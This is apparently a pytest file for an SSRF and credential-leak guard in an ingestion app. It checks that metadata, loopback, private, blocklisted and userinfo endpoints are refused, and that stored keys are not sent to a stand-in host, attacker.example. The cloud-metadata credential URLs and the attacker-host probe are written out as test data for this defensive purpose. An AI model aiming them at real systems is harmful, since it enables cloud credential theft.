"""Tests for the SSRF / credential-exfiltration guard added for issue #87.

Covers three things:
  1. `validate_egress_endpoint` (and the `DeliveryConfig.endpoint` field
     validator built on it) refuses loopback/private/link-local/metadata
     hosts, and unresolvable ones, before any outbound call is made.
  2. `check_connection` and `ingest` in `app/regengine_client.py` guard
     directly too -- this matters because `/api/integration/test` and
     `/api/integration/configure` build their probe config with
     `model_copy(update=...)`, which never re-runs field validators.
  3. `POST /api/integration/test` no longer lets a stored api_key/tenant_id
     ride along to a caller-supplied endpoint on a different host.
"""

from __future__ import annotations

import asyncio
import ipaddress
from datetime import UTC, datetime
from typing import Any

import pytest
from fastapi.testclient import TestClient
from pydantic import HttpUrl

from app.main import app, controller
from app.regengine_client import DEFAULT_LIVE_INGEST_ENDPOINT, LiveRegEngineClient
from app.schemas import simulation as simulation_schemas
from app.schemas.domain import CTEType, RegEngineEvent
from app.schemas.ingestion import IngestPayload
from app.schemas.simulation import (
    PRIVATE_ENDPOINTS_ENV,
    DeliveryConfig,
    EgressBlockedError,
    SimulationConfig,
    validate_egress_endpoint,
)


client = TestClient(app)


def setup_function() -> None:
    asyncio.run(controller.reset(SimulationConfig()))


# ---------------------------------------------------------------------------
# Shared fakes
# ---------------------------------------------------------------------------


class FakeResponse:
    def __init__(self, status_code: int = 200, payload: Any = None) -> None:
        self.status_code = status_code
        self._payload = payload if payload is not None else {"accepted": 1}

    def raise_for_status(self) -> None:
        return None

    def json(self) -> Any:
        return self._payload


class SpyAsyncClient:
    """Fake httpx.AsyncClient that records every call it receives, so a
    test can prove the guard stopped a request before it ever reached the
    wire (an empty `calls` list means no headers -- credential or
    otherwise -- ever left the process)."""

    status_code = 200
    calls: list[dict[str, Any]] = []

    def __init__(self, *, timeout: float) -> None:
        self.timeout = timeout

    async def __aenter__(self) -> "SpyAsyncClient":
        return self

    async def __aexit__(self, exc_type: object, exc: object, tb: object) -> None:
        return None

    async def get(
        self,
        url: str,
        *,
        headers: dict[str, str] | None = None,
        params: dict[str, Any] | None = None,
    ) -> FakeResponse:
        if url.endswith("/health"):
            return FakeResponse(200, {"status": "healthy"})
        SpyAsyncClient.calls.append({"method": "GET", "url": url, "headers": headers or {}, "params": params})
        return FakeResponse(SpyAsyncClient.status_code, {"accepted": 1})

    async def post(
        self,
        url: str,
        *,
        headers: dict[str, str] | None = None,
        content: bytes | None = None,
    ) -> FakeResponse:
        SpyAsyncClient.calls.append({"method": "POST", "url": url, "headers": headers or {}, "content": content})
        return FakeResponse(SpyAsyncClient.status_code, {"accepted": 1})


def make_payload() -> IngestPayload:
    return IngestPayload(
        source="erp",
        events=[
            RegEngineEvent(
                cte_type=CTEType.RECEIVING,
                traceability_lot_code="00012345678901-LOT-2026-001",
                product_description="Romaine Lettuce",
                quantity=500,
                unit_of_measure="cases",
                location_name="Distribution Center #4",
                timestamp=datetime(2026, 2, 5, 8, 30, tzinfo=UTC),
                kdes={"receive_date": "2026-02-05"},
            )
        ],
    )


def _bypass_validator_config(
    *,
    endpoint: str,
    api_key: str = "test-api-key",
    tenant_id: str = "test-tenant-id",
) -> SimulationConfig:
    """Build a SimulationConfig carrying *endpoint* without ever running
    DeliveryConfig's field validator.

    This mirrors exactly how /api/integration/test and
    /api/integration/configure build their probe/stored config today --
    via model_copy(update=...), which does not re-validate fields -- and is
    why check_connection/ingest must call validate_egress_endpoint
    directly rather than relying on the validator alone.
    """
    base = SimulationConfig(delivery=DeliveryConfig(mode="live", api_key=api_key, tenant_id=tenant_id))
    poisoned_delivery = base.delivery.model_copy(update={"endpoint": HttpUrl(endpoint)}, deep=True)
    return base.model_copy(update={"delivery": poisoned_delivery}, deep=True)


# ---------------------------------------------------------------------------
# validate_egress_endpoint -- the reusable guard itself
# ---------------------------------------------------------------------------


def test_validate_egress_endpoint_allows_none() -> None:
    validate_egress_endpoint(None)  # no endpoint configured -> nothing to check, no default to poison


def test_validate_egress_endpoint_allows_the_trusted_regengine_host(monkeypatch: Any) -> None:
    # The documented default host is allowlisted outright and must never
    # trigger a DNS lookup: if it did, this (and every test that relies on
    # the default endpoint) would depend on live network access.
    def _boom(host: str) -> list[Any]:
        raise AssertionError(f"should not resolve the trusted host {host!r}")

    monkeypatch.setattr(simulation_schemas, "_resolved_addresses", _boom)
    validate_egress_endpoint(HttpUrl(DEFAULT_LIVE_INGEST_ENDPOINT))


def test_validate_egress_endpoint_rejects_cloud_metadata_ip() -> None:
    with pytest.raises(EgressBlockedError, match="169.254.169.254"):
        validate_egress_endpoint(HttpUrl("http://169.254.169.254/latest/meta-data/iam/security-credentials/"))


@pytest.mark.parametrize(
    "endpoint",
    [
        "http://127.0.0.1:9000/webhooks/ingest",
        "http://10.0.5.5/webhooks/ingest",
        "http://172.16.3.3/webhooks/ingest",
        "http://192.168.1.1/webhooks/ingest",
        "http://0.0.0.0/webhooks/ingest",
        "http://[::1]:9000/webhooks/ingest",
    ],
)
def test_validate_egress_endpoint_rejects_loopback_and_private_ranges(endpoint: str) -> None:
    with pytest.raises(EgressBlockedError):
        validate_egress_endpoint(HttpUrl(endpoint))


def test_validate_egress_endpoint_allows_an_unresolvable_host(monkeypatch: Any) -> None:
    """An unresolvable host is a connection error, not a security rejection.

    It cannot be dialed, so it is not a pivot. Rejecting it here would also
    tie the guard to resolver availability, making every endpoint fail closed
    wherever there is no DNS (CI sandboxes, an air-gapped demo).
    """
    monkeypatch.setattr(simulation_schemas, "_resolved_addresses", lambda host: [])
    validate_egress_endpoint(HttpUrl("https://definitely-not-a-real-host.invalid/webhooks/ingest"))


def test_validate_egress_endpoint_allows_a_host_that_resolves_publicly(monkeypatch: Any) -> None:
    monkeypatch.setattr(
        simulation_schemas,
        "_resolved_addresses",
        lambda host: [ipaddress.ip_address("8.8.8.8")],
    )
    validate_egress_endpoint(HttpUrl("https://partner.example.net/webhooks/ingest"))


def test_private_endpoints_env_var_is_off_by_default(monkeypatch: Any) -> None:
    monkeypatch.delenv(PRIVATE_ENDPOINTS_ENV, raising=False)
    assert simulation_schemas._private_endpoints_allowed() is False


def test_private_endpoints_env_var_reenables_loopback(monkeypatch: Any) -> None:
    monkeypatch.setenv(PRIVATE_ENDPOINTS_ENV, "1")
    validate_egress_endpoint(HttpUrl("http://localhost:8000/webhooks/ingest"))  # would raise if still blocked


# ---------------------------------------------------------------------------
# DeliveryConfig.endpoint -- construction stays side-effect free; the guard
# itself is enforced at request time (see the check_connection/ingest block)
# ---------------------------------------------------------------------------


def test_delivery_config_construction_does_not_enforce_egress() -> None:
    """Building a config is pure: the guard runs when the socket is opened.

    Constructing a DeliveryConfig must not touch the resolver, so an operator
    can hold a localhost or metadata endpoint in a config object (the local
    demo does exactly that) without model construction reaching the network.
    Enforcement lives in check_connection/ingest, covered below.
    """
    metadata = DeliveryConfig(mode="live", endpoint="http://169.254.169.254/latest/meta-data/")
    assert str(metadata.endpoint) == "http://169.254.169.254/latest/meta-data/"

    loopback = DeliveryConfig(mode="live", endpoint="http://localhost:8000/webhooks/ingest")
    assert str(loopback.endpoint) == "http://localhost:8000/webhooks/ingest"


def test_delivery_config_allows_the_documented_default_host() -> None:
    config = DeliveryConfig(mode="live", endpoint=DEFAULT_LIVE_INGEST_ENDPOINT)
    assert str(config.endpoint) == DEFAULT_LIVE_INGEST_ENDPOINT


# ---------------------------------------------------------------------------
# check_connection / ingest -- the direct guard call that
# model_copy(update=...) would otherwise let slip through
# ---------------------------------------------------------------------------


def test_check_connection_refuses_metadata_endpoint_before_any_request(monkeypatch: Any) -> None:
    SpyAsyncClient.calls = []
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)
    config = _bypass_validator_config(endpoint="http://169.254.169.254/latest/meta-data/")

    with pytest.raises(EgressBlockedError):
        asyncio.run(LiveRegEngineClient().check_connection(config))

    assert SpyAsyncClient.calls == [], "no request, and therefore no credential header, should reach the network"


def test_ingest_refuses_metadata_endpoint_before_any_request(monkeypatch: Any) -> None:
    SpyAsyncClient.calls = []
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)
    config = _bypass_validator_config(
        endpoint="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        api_key="super-secret-live-key",
    )

    with pytest.raises(EgressBlockedError):
        asyncio.run(LiveRegEngineClient().ingest(make_payload(), config))

    assert SpyAsyncClient.calls == []


def test_check_connection_allows_the_default_endpoint(monkeypatch: Any) -> None:
    SpyAsyncClient.calls = []
    SpyAsyncClient.status_code = 200
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)
    config = SimulationConfig(delivery=DeliveryConfig(mode="live", api_key="test-key", tenant_id="test-tenant"))

    result = asyncio.run(LiveRegEngineClient().check_connection(config))

    assert result.verdict == "connected"
    assert len(SpyAsyncClient.calls) == 1
    assert SpyAsyncClient.calls[0]["headers"]["X-RegEngine-API-Key"] == "test-key"


def test_ingest_allows_the_default_endpoint(monkeypatch: Any) -> None:
    SpyAsyncClient.calls = []
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)
    config = SimulationConfig(delivery=DeliveryConfig(mode="live", api_key="test-key", tenant_id="test-tenant"))

    result = asyncio.run(LiveRegEngineClient().ingest(make_payload(), config))

    assert result.response == {"accepted": 1}
    assert len(SpyAsyncClient.calls) == 1


def test_escape_hatch_reenables_localhost_for_check_connection(monkeypatch: Any) -> None:
    monkeypatch.setenv(PRIVATE_ENDPOINTS_ENV, "1")
    SpyAsyncClient.calls = []
    SpyAsyncClient.status_code = 200
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)
    config = SimulationConfig(
        delivery=DeliveryConfig(
            mode="live",
            endpoint="http://localhost:8000/api/v1/webhooks/ingest",
            api_key="dev-key",
            tenant_id="dev-tenant",
        )
    )

    result = asyncio.run(LiveRegEngineClient().check_connection(config))

    assert result.verdict == "connected"
    assert SpyAsyncClient.calls[0]["url"].startswith("http://localhost:8000")


# ---------------------------------------------------------------------------
# POST /api/integration/test -- end to end, including the
# model_copy(update=...) merge that let this bug through in the first place
# ---------------------------------------------------------------------------


def test_integration_test_route_refuses_metadata_probe_and_makes_no_calls(monkeypatch: Any) -> None:
    SpyAsyncClient.calls = []
    SpyAsyncClient.status_code = 200
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)

    response = client.post(
        "/api/integration/test",
        json={
            "endpoint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "api_key": "probe-key",
            "tenant_id": "probe-tenant",
        },
    )

    assert response.status_code == 400, response.text
    assert "169.254.169.254" in response.text
    assert SpyAsyncClient.calls == []
    assert "probe-key" not in response.text


def test_integration_test_route_does_not_leak_stored_credentials_to_a_different_host(monkeypatch: Any) -> None:
    SpyAsyncClient.calls = []
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)

    configured = client.post(
        "/api/integration/configure",
        json={
            "mode": "live",
            "endpoint": "https://www.regengine.co/api/v1/webhooks/ingest",
            "api_key": "rge_live_super_secret_key",
            "tenant_id": "11111111-1111-1111-1111-111111111111",
        },
    )
    assert configured.status_code == 200

    # Mirrors the issue's exact repro: only `endpoint` is supplied. Under
    # the old code this kept the stored api_key/tenant_id and sent them to
    # the attacker's host. Since no fresh credentials are supplied for this
    # new host, check_connection's own "not both api_key and tenant_id"
    # check now returns not_configured before it ever reaches the network
    # -- so this assertion holds regardless of whether attacker.example
    # resolves to anything.
    response = client.post("/api/integration/test", json={"endpoint": "https://attacker.example"})

    assert response.status_code == 200
    body = response.json()
    assert body["verdict"] == "not_configured"
    assert "rge_live_super_secret_key" not in response.text
    assert SpyAsyncClient.calls == [], "no probe should have been sent without credentials for the new host"


def test_integration_test_route_still_lets_the_caller_probe_a_new_host_with_fresh_credentials(
    monkeypatch: Any,
) -> None:
    # The flip side of the leak fix: explicit credentials for the new host
    # are honored, not blanket-refused.
    SpyAsyncClient.calls = []
    SpyAsyncClient.status_code = 200
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)
    monkeypatch.setattr(
        simulation_schemas,
        "_resolved_addresses",
        lambda host: [ipaddress.ip_address("8.8.8.8")],
    )

    client.post(
        "/api/integration/configure",
        json={
            "mode": "live",
            "endpoint": "https://www.regengine.co/api/v1/webhooks/ingest",
            "api_key": "rge_live_super_secret_key",
            "tenant_id": "11111111-1111-1111-1111-111111111111",
        },
    )

    response = client.post(
        "/api/integration/test",
        json={
            "endpoint": "https://partner.example.net/webhooks/recent",
            "api_key": "fresh-partner-key",
            "tenant_id": "fresh-partner-tenant",
        },
    )

    assert response.status_code == 200
    assert response.json()["verdict"] == "connected"
    assert SpyAsyncClient.calls[0]["headers"]["X-RegEngine-API-Key"] == "fresh-partner-key"
    assert "rge_live_super_secret_key" not in response.text


def test_integration_test_route_still_works_for_the_stored_host(monkeypatch: Any) -> None:
    SpyAsyncClient.calls = []
    SpyAsyncClient.status_code = 200
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)

    response = client.post(
        "/api/integration/test",
        json={"api_key": "rge_live_probe_key", "tenant_id": "22222222-2222-2222-2222-222222222222"},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["verdict"] == "connected"
    assert len(SpyAsyncClient.calls) == 1


def test_integration_test_route_escape_hatch_allows_localhost(monkeypatch: Any) -> None:
    monkeypatch.setenv(PRIVATE_ENDPOINTS_ENV, "1")
    SpyAsyncClient.calls = []
    SpyAsyncClient.status_code = 200
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)

    response = client.post(
        "/api/integration/test",
        json={
            "endpoint": "http://localhost:8000/api/v1/webhooks/ingest",
            "api_key": "dev-key",
            "tenant_id": "dev-tenant",
        },
    )

    assert response.status_code == 200
    assert response.json()["verdict"] == "connected"
    assert SpyAsyncClient.calls, "the probe should have gone out once the escape hatch is set"
    assert SpyAsyncClient.calls[0]["url"].startswith("http://localhost:8000")


# ---------------------------------------------------------------------------
# Inline `delivery` blocks on other routes -- proves the DeliveryConfig
# validator protects these for free, without touching those routers/schemas
# ---------------------------------------------------------------------------


_DELIVERABLE_CSV = (
    "cte_type,traceability_lot_code,product_description,quantity,unit_of_measure,"
    "location_name,timestamp,source_traceability_lot_code,input_traceability_lot_codes,"
    "reference_document_type,reference_document_number\n"
    "harvesting,TLC-EGRESS-1,Romaine Lettuce,120,cases,Valley Fresh Farms,"
    "2026-02-05T08:00:00Z,,,Harvest Log,HAR-001\n"
)


def test_inline_delivery_on_an_ingestion_route_never_reaches_the_metadata_address(
    monkeypatch: Any,
) -> None:
    """The guard covers routes that carry an inline `delivery` block too.

    CSV import accepts a full DeliveryConfig in its body, so it is a second
    way to aim live delivery at an arbitrary host. Enforcement is at request
    time, so what matters — and what this asserts — is that nothing ever
    reaches the wire: an empty spy means no credential header, and no
    request at all, left the process.
    """
    SpyAsyncClient.calls = []
    monkeypatch.setattr("app.regengine_client.httpx.AsyncClient", SpyAsyncClient)

    response = client.post(
        "/api/import/csv",
        json={
            "import_type": "scheduled_events",
            "csv_text": _DELIVERABLE_CSV,
            "delivery": {
                "mode": "live",
                "endpoint": "http://169.254.169.254/latest/meta-data/",
                "api_key": "inline-key",
                "tenant_id": "inline-tenant",
            },
        },
    )

    assert SpyAsyncClient.calls == []
    assert "inline-key" not in response.text
    assert response.status_code < 500, response.text


def test_name_based_blocklist_rejects_localhost() -> None:
    """Name-based blocklist backstops the address check when DNS fails."""
    from app.schemas.simulation import EgressBlockedError, validate_egress_endpoint
    from pydantic import HttpUrl

    for hostname in ("localhost", "metadata.google.internal", "evil.localhost", "internal.local"):
        url = HttpUrl(f"https://{hostname}/api/v1/webhooks/ingest")
        try:
            validate_egress_endpoint(url)
            raise AssertionError(f"{hostname} should have been blocked")
        except EgressBlockedError:
            pass


def test_name_based_blocklist_allows_private_endpoints_escape_hatch(
    monkeypatch: Any,
) -> None:
    """REGENGINE_ALLOW_PRIVATE_ENDPOINTS=1 bypasses the name blocklist."""
    from app.schemas.simulation import validate_egress_endpoint
    from pydantic import HttpUrl

    monkeypatch.setenv("REGENGINE_ALLOW_PRIVATE_ENDPOINTS", "1")
    url = HttpUrl("http://localhost:8000/api/v1/webhooks/ingest")
    validate_egress_endpoint(url)


def test_userinfo_in_url_is_rejected() -> None:
    """Endpoints with embedded credentials (user:pass@host) must be blocked."""
    from app.schemas.simulation import EgressBlockedError, validate_egress_endpoint
    from pydantic import HttpUrl

    for url_str in (
        "https://admin:secret@example.com/api/v1/webhooks/ingest",
        "https://user@example.com/api/v1/webhooks/ingest",
    ):
        with pytest.raises(EgressBlockedError, match="userinfo"):
            validate_egress_endpoint(HttpUrl(url_str))


def test_userinfo_rejection_precedes_address_check() -> None:
    """Userinfo rejection fires even for the trusted host, before DNS."""
    from app.schemas.simulation import EgressBlockedError, validate_egress_endpoint
    from pydantic import HttpUrl

    with pytest.raises(EgressBlockedError, match="userinfo"):
        validate_egress_endpoint(HttpUrl("https://user:pass@www.regengine.co/api/v1/webhooks/ingest"))
